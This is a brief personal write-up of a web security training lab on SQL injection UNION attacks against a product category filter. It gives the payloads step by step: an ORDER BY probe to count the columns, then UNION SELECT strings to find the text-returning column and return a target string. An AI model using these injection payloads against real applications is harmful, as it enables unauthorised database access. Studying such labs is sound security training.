# Ninth Lab : SQL Injection

Lab - 09 : SQL injection UNION attack, finding a column containing text

SQL Injection : Product category filter

Endgoal : Perform a SQL injection UNION attack that returns an string given to us 

Analysis : 

1. SQL injectability → True
2. Determining the number of columns
    
    ```
    Payload -> ' order by 1--
    ```
    
    No of columns → 3
    
3. Finding out which one returns string 
    
    ```
    Payload -> ' union select null, 'a', null--
    ```
    
    changing the dummy string text to different places in null to find out which returns the string data 
    
    After finding out which returns string data, we can upload whatever string we like it to return. 
    
    ```
    Final Payload -> ' union select null, 'oDX7OI', null--
    ```
    

Pretty ezzzzzzzzz